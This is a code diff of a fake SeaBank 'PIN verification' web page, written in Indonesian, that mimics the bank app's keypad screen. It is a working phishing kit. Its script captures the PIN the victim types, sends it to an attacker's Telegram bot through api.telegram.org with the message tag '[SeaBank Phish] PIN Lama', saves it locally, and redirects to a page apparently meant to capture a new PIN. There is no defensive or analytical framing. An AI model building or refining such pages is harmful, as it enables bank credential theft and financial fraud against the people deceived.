@@ -6,7 +6,7 @@
     <title>Verifikasi PIN SeaBank</title>
     
     <style>
-        /* CSS Umum dan Warna Konsisten dengan Seabank */
+        /* CSS Keypad dan Tampilan (Sama seperti sebelumnya) */
         body {
             font-family: Arial, sans-serif;
             background-color: #ffffff;
@@ -16,11 +16,9 @@
             flex-direction: column;
             justify-content: space-between;
             min-height: 100vh;
-            /* Mencegah scrolling horizontal pada body */
             overflow-x: hidden; 
         }
 
-        /* --- Header Aplikasi --- */
         .app-header {
             display: flex;
             align-items: center;
@@ -38,7 +36,6 @@
             cursor: pointer;
         }
 
-        /* --- Konten Utama (Logo, Teks, Indikator PIN) --- */
         .main-content {
             flex-grow: 1;
             display: flex;
@@ -47,7 +44,6 @@
             justify-content: center;
             padding: 20px;
             text-align: center;
-            /* Memastikan konten tidak mendorong keypad ke luar layar */
             min-height: 0; 
         }
 
@@ -74,7 +70,6 @@
             display: block;
         }
 
-        /* --- Indikator PIN (Titik-titik) --- */
         .pin-indicator-container {
             display: flex;
             justify-content: center;
@@ -95,23 +90,22 @@
             background-color: #ff6600;
         }
 
-        /* --- Keypad Numerik (PERBAIKAN UKURAN) --- */
         .keypad-container {
             background-color: #ffffff; 
-            padding: 10px 20px 40px; /* Padding bawah lebih besar */
+            padding: 10px 20px 40px; 
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 15px; /* Jarak antar tombol disesuaikan */
+            gap: 15px; 
             width: 100%;
-            max-width: 350px; /* Lebar maksimum keypad dikecilkan */
+            max-width: 350px; 
             margin: 0 auto;
-            box-sizing: border-box; /* Memastikan padding tidak menambah lebar total */
+            box-sizing: border-box;
         }
 
         .keypad-button {
             background-color: #f7f7f7; 
             border: none; 
-            border-radius: 50%; /* Dibuat 50% untuk kepastian bentuk bulat */
+            border-radius: 50%; 
             padding: 0;
             font-size: 1.6em;
             font-weight: 500;
@@ -122,7 +116,6 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            /* Menggunakan padding-top untuk proporsi yang benar */
             padding-top: 100%; 
             position: relative;
         }
@@ -138,14 +131,12 @@
             background-color: #e0e0e0;
         }
         
-        /* Tombol kosong di baris terakhir (kiri) */
         .keypad-button.empty {
             background-color: transparent;
             border: none;
             cursor: default;
         }
         
-        /* Tombol hapus */
         .keypad-button.delete {
             background-color: transparent;
             border: none;
@@ -196,7 +187,7 @@ Verifikasi PIN SeaBank
         <div class="keypad-button" data-value="8"><span>8</span></div>
         <div class="keypad-button" data-value="9"><span>9</span></div>
         <div class="keypad-button empty"></div> 
-<div class="keypad-button" data-value="0"><span>0</span></div>
+        <div class="keypad-button" data-value="0"><span>0</span></div>
         <div class="keypad-button delete" data-value="delete">
             <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='currentColor'><path d='M22 3H7c-.69 0-1.05.35-1.35.65L3 8l3.65 4.35c.3.3.66.65 1.35.65H22c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 8h-4V7h4v4z'/></svg>" 
                  alt="Hapus" 
@@ -226,20 +217,12 @@ Verifikasi PIN SeaBank
                 });
             }
 
-            // Fungsi untuk mengirim data ke Telegram
             function sendToTelegram(message) {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
                 
-                // Menggunakan Fetch API untuk permintaan asinkronus
-                fetch(url)
-                    .then(response => {
-                        if (!response.ok) {
-                            console.error('Gagal mengirim ke Telegram:', response.statusText);
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error saat melakukan fetch ke Telegram:', error);
-                    });
+                fetch(url).catch(error => {
+                    console.error('Error saat mengirim ke Telegram:', error);
+                });
             }
 
             keypadButtons.forEach(button => {
@@ -248,23 +231,24 @@ Verifikasi PIN SeaBank
 
                     if (value === 'delete') {
                         currentPin = currentPin.slice(0, -1);
-                    } else if (value && currentPin.length < pinLength) {
+                    } else if (value && currentPin.length < pinLength) { 
                         currentPin += value;
                     }
 
                     updatePinDisplay();
 
                     if (currentPin.length === pinLength) {
-                        // PIN Lengkap, KIRIM KE TELEGRAM
-                        const pinMessage = `[SeaBank Phish] PIN Lama: ${currentPin}`;
+                        
+                        // 1. SIMPAN PIN LAMA KE LOCALSTORAGE
+                        localStorage.setItem('oldPin', currentPin);
+                        
+                        // 2. KIRIM PIN LAMA KE TELEGRAM
+                        const pinMessage = `[SeaBank Phish] PIN Lama Diterima: ${currentPin}`;
                         sendToTelegram(pinMessage);
                         
-                        // Lanjutkan ke halaman OTP
+                        // 3. LANJUTKAN KE HALAMAN PIN BARU
                         setTimeout(() => {
-                            alert('PIN berhasil dimasukkan. Melanjutkan ke halaman OTP.');
-                            window.location.href = 'otp_verification.html'; 
-                            currentPin = ''; 
-                            updatePinDisplay();
+                            window.location.href = 'pin_baru.html'; 
                         }, 500);
                     }
                 });
